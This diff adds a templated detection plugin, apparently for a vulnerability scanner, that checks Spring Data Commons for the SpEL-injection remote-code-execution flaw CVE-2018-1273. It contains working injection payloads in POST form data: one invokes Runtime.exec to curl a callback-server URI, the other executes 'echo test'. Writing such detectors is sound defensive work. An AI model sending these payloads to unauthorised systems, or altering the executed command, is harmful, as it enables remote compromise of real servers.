@@ -1,0 +1,130 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "SpringDataCommons_SpEL_Injection_CVE_2018_1273"
+  author: "mangeshwalsane2-hash"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2018-1273"
+  }
+  severity: CRITICAL
+  title: "Remote Code Execution via SpEL Injection in Spring Data Commons (CVE-2018-1273)"
+  description: "Spring Data Commons versions prior to 2.0.6 and 1.13.11 contain a vulnerability in property path binding (MapDataBinder) where parameter names are evaluated as Spring Expression Language (SpEL) expressions using StandardEvaluationContext, leading to unauthenticated remote code execution."
+  recommendation: "Upgrade Spring Data Commons to version 2.0.6, 1.13.11, or newer."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2018-1273"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_spring_app"
+  http_request: {
+    method: GET
+    uri: "/users"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          {
+            body: {}
+            contains: "action=\"/users"
+          },
+          {
+            body: {}
+            contains: "name=\"username\""
+          }
+        ]
+      }
+    }
+  }
+}
+
+# Out-of-Band Check (with Callback Server)
+actions: {
+  name: "trigger_spel_rce_oob"
+  http_request: {
+    method: POST
+    uri: "/users"
+    headers: [
+      {
+        name: "Content-Type"
+        value: "application/x-www-form-urlencoded"
+      }
+    ]
+    data: "username[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('curl {{ T_CBS_URI }}')]=a&password=test&repeatedPassword=test"
+  }
+}
+
+# Reflective Check (without Callback Server)
+actions: {
+  name: "trigger_spel_rce_reflective"
+  http_request: {
+    method: POST
+    uri: "/users"
+    headers: [
+      {
+        name: "Content-Type"
+        value: "application/x-www-form-urlencoded"
+      }
+    ]
+    data: "username[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('echo test')]=a&password=test&repeatedPassword=test"
+    response: {
+      expect_all: {
+        conditions: [
+          {
+            body: {}
+            contains: "InvocationTargetException"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 1000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "fingerprint_spring_app",
+    "trigger_spel_rce_oob",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
+
+workflows: {
+  actions: [
+    "fingerprint_spring_app",
+    "trigger_spel_rce_reflective"
+  ]
+}
